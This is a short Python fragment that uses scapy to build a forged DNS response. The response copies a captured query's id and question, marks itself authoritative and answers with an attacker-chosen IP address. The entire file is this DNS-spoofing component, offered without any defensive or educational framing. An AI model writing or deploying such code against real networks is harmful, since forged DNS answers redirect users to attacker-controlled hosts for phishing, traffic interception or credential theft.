from scapy.all import DNS,DNSRR
def dns_spoof(packet ,spoofedIp:str  ):
      return DNS(id=packet[DNS].id,qd=packet[DNS].qd,
                        aa=1,
                        qr=1,
                        an=DNSRR(rrname=packet[DNS].qd.qname,type='A',ttl=10,rdata=spoofedIp))
      